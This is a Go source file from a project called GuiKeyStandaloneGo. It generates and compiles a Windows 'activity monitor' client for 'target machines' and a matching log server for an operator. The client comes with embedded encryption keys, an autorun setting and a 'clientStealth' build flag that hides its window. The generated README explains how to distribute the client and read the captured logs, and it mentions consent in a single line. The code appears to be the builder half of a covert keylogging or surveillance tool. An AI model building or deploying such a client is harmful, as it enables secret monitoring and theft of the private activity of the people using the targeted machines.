// GuiKeyStandaloneGo/generator/core/generate.go
package core

import (
	"bytes"
	"fmt"
	"html/template"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	"guikeystandalonego/pkg/config"
	"guikeystandalonego/pkg/crypto"

	"github.com/libp2p/go-libp2p/core/peer"
)

type GeneratorSettings struct {
	OutputDirPath         string
	BootstrapAddresses    string
	ClientConfigOverrides config.ClientSettings
	ServerConfigOverrides config.ServerSettings
}

type GeneratedInfo struct {
	AppClientID           string
	AppEncryptionKeyHex   string
	ServerPeerID          string
	ServerIdentitySeedHex string
}

const readmeTemplate = `Activity Monitoring Suite - Generated Packages (P2P Mode)
========================================================

This package was generated by the GuiKeyStandaloneGo Generator on {{.Timestamp}}.

Generated App-Level Client ID (for logs): {{.Generated.AppClientID}}
Generated App-Level Encryption Key (Hex): {{.Generated.AppEncryptionKeyHex}}
Generated Server Libp2p Peer ID: {{.Generated.ServerPeerID}}
Generated Server Libp2p Identity Seed (Hex): {{.Generated.ServerIdentitySeedHex}}

Instructions:
------------

1. Local Log Server (For Your Machine - The Operator):
   - The 'LocalLogServer_Package' directory contains the server application and its configuration.
   - It also contains 'web_templates' and 'static' subdirectories for the UI.
   - Run '{{.ServerExeName}}' from within this directory.
   - Server P2P Listen Address (configured): {{.ServerConfig.ListenAddress}}
   - Server Web UI Listen Address: {{.ServerConfig.WebUIListenAddress}}
   - Access Web UI at: http://{{.WebUIAccessAddress}}/logs
   - Server Bootstrap Addresses: {{range .ServerConfig.BootstrapAddresses}}{{.}} {{end}}
   - Server Log File: {{.ServerConfig.InternalLogFileDir}}/{{.ServerConfig.InternalLogFileName}} (Level: {{.ServerConfig.InternalLogLevel}})

2. Activity Monitor Client (For Distribution to Target Machines):
   - The 'ActivityMonitorClient_Package' directory contains the client application.
   - Distribute the *contents* of this directory to the machine(s) you want to monitor.
   - Run '{{.ClientExeName}}' on the target machine(s).
   - It is configured to connect to Server Peer ID: {{.Generated.ServerPeerID}}
   - It will use these bootstrap multiaddresses: {{range .ClientConfig.BootstrapAddresses}}{{.}} {{end}}
   - Client Log File: {{.ClientConfig.InternalLogFileDir}}/{{.ClientConfig.InternalLogFileName}} (Level: {{.ClientConfig.InternalLogLevel}})

Security Considerations:
- The app-level encryption key is vital for data confidentiality. Keep it secure.
- The server's libp2p identity seed is critical.
- Secure the machine running the Local Log Server.
- Ensure proper consent and adhere to privacy laws when deploying the client monitor.
`

const clientGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main 

const (
	CfgServerPeerID                       = "{{.ServerPeerID}}"
	CfgEncryptionKeyHex                   = "{{.EncryptionKeyHex}}"
	CfgClientID                           = "{{.ClientID}}"
	CfgSyncIntervalSecs                   = {{.SyncIntervalSecs}}
	CfgProcessorPeriodicFlushIntervalSecs = {{.ProcessorPeriodicFlushIntervalSecs}}
	CfgInternalLogLevel                   = "{{.InternalLogLevel}}"
	CfgLogFilePath                        = ` + "`{{.LogFilePath}}`" + ` 
	CfgAppNameForAutorun                  = "{{.AppNameForAutorun}}"
	CfgLocalLogCacheRetentionDays         = {{.LocalLogCacheRetentionDays}}
	CfgRetryIntervalOnFailSecs            = {{.RetryIntervalOnFailSecs}}
	CfgMaxRetriesPerBatch                 = {{.MaxRetriesPerBatch}}
	CfgMaxEventsPerSyncBatch              = {{.MaxEventsPerSyncBatch}}
	CfgInternalLogFileDir                 = ` + "`{{.InternalLogFileDir}}`" + `
	CfgInternalLogFileName                = "{{.InternalLogFileName}}"
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}

{{if .MaxLogFileSizeMBIsSet}}
var CfgMaxLogFileSizeMBValue = uint64({{.MaxLogFileSizeMBValue}})
var CfgMaxLogFileSizeMB = &CfgMaxLogFileSizeMBValue
{{else}}
var CfgMaxLogFileSizeMB *uint64 = nil
{{end}}
`

const serverGeneratedConfigTemplate = `// Code generated by GuiKeyStandaloneGo generator. DO NOT EDIT.
package main

const (
	CfgP2PListenAddress            = "{{.ListenAddress}}"
	CfgWebUIListenAddress          = "{{.WebUIListenAddress}}"
	CfgEncryptionKeyHex            = "{{.EncryptionKeyHex}}"
	CfgServerIdentityKeySeedHex    = "{{.ServerIdentityKeySeedHex}}"
	CfgDatabasePath                = ` + "`{{.DatabasePath}}`" + `
	CfgLogRetentionDays            = {{.LogRetentionDays}}
	CfgLogDeletionCheckIntervalHrs = {{.LogDeletionCheckIntervalHrs}}
	CfgInternalLogLevel            = "{{.InternalLogLevel}}"      
	CfgInternalLogFileDir          = ` + "`{{.InternalLogFileDir}}`" + `   
	CfgInternalLogFileName         = "{{.InternalLogFileName}}"      
)

var CfgBootstrapAddresses = []string{
{{range .BootstrapAddresses}}	` + "`{{.}}`," + `
{{end}}}
`

func PerformGeneration(genSettings *GeneratorSettings) (GeneratedInfo, error) {
	var genInfo GeneratedInfo
	log.Println("Starting generation process (with embedded configs)...")

	if genSettings.OutputDirPath == "" {
		return genInfo, fmt.Errorf("output directory is not set")
	}
	if err := os.MkdirAll(genSettings.OutputDirPath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create output directory: %w", err)
	}

	genInfo.AppClientID = crypto.GenerateAppClientID()
	aesKeyBytes, err := crypto.GenerateAESKeyBytes()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate AES key: %w", err)
	}
	genInfo.AppEncryptionKeyHex = fmt.Sprintf("%x", aesKeyBytes)

	serverIdentitySeedHex, err := crypto.GenerateLibp2pIdentitySeedHex()
	if err != nil {
		return genInfo, fmt.Errorf("failed to generate server identity seed: %w", err)
	}
	genInfo.ServerIdentitySeedHex = serverIdentitySeedHex

	serverPrivKey, _, err := crypto.Libp2pKeyFromSeedHex(serverIdentitySeedHex)
	if err != nil {
		return genInfo, fmt.Errorf("failed to derive server libp2p key: %w", err)
	}
	serverPID, err := peer.IDFromPrivateKey(serverPrivKey)
	if err != nil {
		return genInfo, fmt.Errorf("failed to get server peer ID: %w", err)
	}
	genInfo.ServerPeerID = serverPID.String()

	log.Printf("Generated App Client ID: %s", genInfo.AppClientID)
	log.Printf("Generated Server Peer ID: %s", genInfo.ServerPeerID)

	// --- Prepare Client Configuration Values ---
	clientCfgValues := config.DefaultClientSettings()
	clientCfgValues.ClientID = genInfo.AppClientID
	clientCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	clientCfgValues.ServerPeerID = genInfo.ServerPeerID
	if genSettings.BootstrapAddresses != "" {
		addrs := strings.Split(genSettings.BootstrapAddresses, ",")
		clientCfgValues.BootstrapAddresses = make([]string, 0, len(addrs))
		for _, addr := range addrs {
			trimmedAddr := strings.TrimSpace(addr)
			if trimmedAddr != "" {
				clientCfgValues.BootstrapAddresses = append(clientCfgValues.BootstrapAddresses, trimmedAddr)
			}
		}
	}

	// --- Prepare Server Configuration Values ---
	serverCfgValues := config.DefaultServerSettings()
	serverCfgValues.EncryptionKeyHex = genInfo.AppEncryptionKeyHex
	serverCfgValues.ServerIdentityKeySeedHex = genInfo.ServerIdentitySeedHex
	if len(clientCfgValues.BootstrapAddresses) > 0 {
		serverCfgValues.BootstrapAddresses = make([]string, len(clientCfgValues.BootstrapAddresses))
		copy(serverCfgValues.BootstrapAddresses, clientCfgValues.BootstrapAddresses)
	} else {
		serverCfgValues.BootstrapAddresses = []string{}
	}

	_, currentFilePath, _, ok := runtime.Caller(0)
	if !ok {
		return genInfo, fmt.Errorf("could not get current file path for template resolution")
	}
	corePackageDir := filepath.Dir(currentFilePath)
	generatorPackageDir := filepath.Dir(corePackageDir)
	templatesBaseDir := filepath.Join(generatorPackageDir, "templates")

	clientSrcPath := filepath.Join(templatesBaseDir, "client_template")
	serverSrcPath := filepath.Join(templatesBaseDir, "server_template")

	clientExeName := "activity_monitor_client.exe"
	serverExeName := "local_log_server.exe"

	clientPackagePath := filepath.Join(genSettings.OutputDirPath, "ActivityMonitorClient_Package")
	serverPackagePath := filepath.Join(genSettings.OutputDirPath, "LocalLogServer_Package")

	if err := os.MkdirAll(clientPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create client package dir: %w", err)
	}
	if err := os.MkdirAll(serverPackagePath, 0755); err != nil {
		return genInfo, fmt.Errorf("failed to create server package dir: %w", err)
	}

	clientTemplateData := struct {
		config.ClientSettings
		MaxLogFileSizeMBIsSet bool
		MaxLogFileSizeMBValue uint64
	}{ClientSettings: clientCfgValues}
	if clientCfgValues.MaxLogFileSizeMB != nil {
		clientTemplateData.MaxLogFileSizeMBIsSet = true
		clientTemplateData.MaxLogFileSizeMBValue = *clientCfgValues.MaxLogFileSizeMB
	}

	clientGeneratedGoPath := filepath.Join(clientSrcPath, "config_generated.go")
	if err := writeGoConfig(clientGeneratedGoPath, clientGeneratedConfigTemplate, clientTemplateData); err != nil {
		return genInfo, fmt.Errorf("failed to write client_generated_config.go: %w", err)
	}

	serverGeneratedGoPath := filepath.Join(serverSrcPath, "config_generated.go")
	if err := writeGoConfig(serverGeneratedGoPath, serverGeneratedConfigTemplate, serverCfgValues); err != nil {
		return genInfo, fmt.Errorf("failed to write server_generated_config.go: %w", err)
	}

	clientOutPath := filepath.Join(clientPackagePath, clientExeName)
	serverOutPath := filepath.Join(serverPackagePath, serverExeName)

	log.Println("Compiling client template...")
	if err := compileGoTemplate(clientSrcPath, clientOutPath, true); err != nil {
		return genInfo, fmt.Errorf("failed to compile client template: %w", err)
	}
	log.Println("Compiling server template...")
	if err := compileGoTemplate(serverSrcPath, serverOutPath, false); err != nil {
		return genInfo, fmt.Errorf("failed to compile server template: %w", err)
	}

	defer os.Remove(clientGeneratedGoPath)
	defer os.Remove(serverGeneratedGoPath)

	serverPackageStaticDir := filepath.Join(serverPackagePath, "static")
	serverPackageTemplatesDir := filepath.Join(serverPackagePath, "web_templates")

	sourceStaticDir := filepath.Join(serverSrcPath, "static")
	sourceWebTemplatesDir := filepath.Join(serverSrcPath, "web_templates")

	if err := copyDir(sourceStaticDir, serverPackageStaticDir); err != nil {
		log.Printf("Warning: Failed to copy server static assets from %s: %v", sourceStaticDir, err)
	} else {
		log.Printf("Copied server static assets to %s", serverPackageStaticDir)
	}
	if err := copyDir(sourceWebTemplatesDir, serverPackageTemplatesDir); err != nil {
		log.Printf("Warning: Failed to copy server HTML templates from %s: %v", sourceWebTemplatesDir, err)
	} else {
		log.Printf("Copied server HTML templates to %s", serverPackageTemplatesDir)
	}

	readmeData := struct {
		Timestamp          string
		Generated          GeneratedInfo
		ClientConfig       config.ClientSettings
		ServerConfig       config.ServerSettings
		ClientExeName      string
		ServerExeName      string
		WebUIAccessAddress string
	}{
		Timestamp:          time.Now().Format(time.RFC1123),
		Generated:          genInfo,
		ClientConfig:       clientCfgValues,
		ServerConfig:       serverCfgValues,
		ClientExeName:      clientExeName,
		ServerExeName:      serverExeName,
		WebUIAccessAddress: strings.Replace(serverCfgValues.WebUIListenAddress, "0.0.0.0", "127.0.0.1", 1),
	}
	tmplReadme, err := template.New("readme").Parse(readmeTemplate)
	if err != nil {
		return genInfo, fmt.Errorf("failed to parse README template: %w", err)
	}
	readmeFile, err := os.Create(filepath.Join(genSettings.OutputDirPath, "README_IMPORTANT_INSTRUCTIONS.txt"))
	if err != nil {
		return genInfo, fmt.Errorf("failed to create README file: %w", err)
	}
	defer readmeFile.Close()
	if err := tmplReadme.Execute(readmeFile, readmeData); err != nil {
		return genInfo, fmt.Errorf("failed to execute README template: %w", err)
	}

	log.Println("Generation process completed successfully!")
	log.Printf("Packages generated in: %s", genSettings.OutputDirPath)
	return genInfo, nil
}

func writeGoConfig(path string, goTemplateContent string, cfgData interface{}) error {
	tmpl, err := template.New("goconfig").Parse(goTemplateContent)
	if err != nil {
		return fmt.Errorf("failed to parse Go config template for path %s: %w", path, err)
	}
	parentDir := filepath.Dir(path)
	if err := os.MkdirAll(parentDir, 0755); err != nil {
		return fmt.Errorf("failed to create parent directory %s for generated Go config: %w", parentDir, err)
	}
	file, err := os.Create(path)
	if err != nil {
		return fmt.Errorf("failed to create generated Go config file %s: %w", path, err)
	}
	defer file.Close()
	if err := tmpl.Execute(file, cfgData); err != nil {
		return fmt.Errorf("failed to execute Go config template for %s: %w", path, err)
	}
	return nil
}

func compileGoTemplate(srcDir, outputPath string, clientStealth bool) error {
	// Explicitly specify "." to build the package in the current directory (cmd.Dir).
	// Add "-v" for verbose output from the build command.
	args := []string{"build", "-v", "-o", outputPath}

	buildEnv := append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	var ldflags []string
	if clientStealth {
		ldflags = append(ldflags, "-H=windowsgui")
	}
	if len(ldflags) > 0 {
		args = append(args, "-ldflags="+strings.Join(ldflags, " "))
	}

	// Add the package specifier "." to the end of args
	args = append(args, ".")

	cmd := exec.Command("go", args...)
	cmd.Dir = srcDir
	cmd.Env = buildEnv

	var stdout bytes.Buffer
	var stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	log.Printf("Running build command: go %s (Target Env: GOOS=%s GOARCH=%s CGO_ENABLED=%s) in %s",
		strings.Join(args, " "), // cmd.Args[0] is "go", so join args directly for logging
		buildEnvValueFor("GOOS", cmd.Env), buildEnvValueFor("GOARCH", cmd.Env),
		buildEnvValueFor("CGO_ENABLED", cmd.Env),
		cmd.Dir)

	if err := cmd.Run(); err != nil {
		return fmt.Errorf("failed to compile %s: %w\nBuild command: go %s\nEnv: %v\nDir: %s\nStdout: %s\nStderr: %s",
			srcDir, err, strings.Join(args, " "), cmd.Env, cmd.Dir, stdout.String(), stderr.String())
	}
	return nil
}

func buildEnvValueFor(key string, env []string) string {
	prefix := key + "="
	for _, entry := range env {
		if strings.HasPrefix(entry, prefix) {
			return entry[len(prefix):]
		}
	}
	return ""
}

func copyDir(src string, dst string) error {
	srcInfo, err := os.Stat(src)
	if err != nil {
		if os.IsNotExist(err) {
			log.Printf("Info: Source directory %s does not exist, skipping copy.", src)
			return nil
		}
		return err
	}
	if !srcInfo.IsDir() {
		return fmt.Errorf("source %s is not a directory", src)
	}
	if err := os.MkdirAll(dst, srcInfo.Mode()); err != nil {
		return err
	}
	entries, err := os.ReadDir(src)
	if err != nil {
		return err
	}
	for _, entry := range entries {
		srcPath := filepath.Join(src, entry.Name())
		dstPath := filepath.Join(dst, entry.Name())
		if entry.IsDir() {
			if err := copyDir(srcPath, dstPath); err != nil {
				return err
			}
		} else {
			srcFile, errF := os.Open(srcPath)
			if errF != nil {
				return errF
			}
			dstFile, errC := os.Create(dstPath)
			if errC != nil {
				srcFile.Close()
				return errC
			}
			if _, errCP := io.Copy(dstFile, srcFile); errCP != nil {
				srcFile.Close()
				dstFile.Close()
				return errCP
			}
			srcFile.Close()
			dstFile.Close()
			fileInfo, errI := entry.Info()
			if errI == nil {
				if errC := os.Chmod(dstPath, fileInfo.Mode()); errC != nil {
					log.Printf("Warning: could not chmod %s: %v", dstPath, errC)
				}
			} else {
				log.Printf("Warning: could not get FileInfo for %s to copy mode: %v", srcPath, errI)
			}
		}
	}
	return nil
}
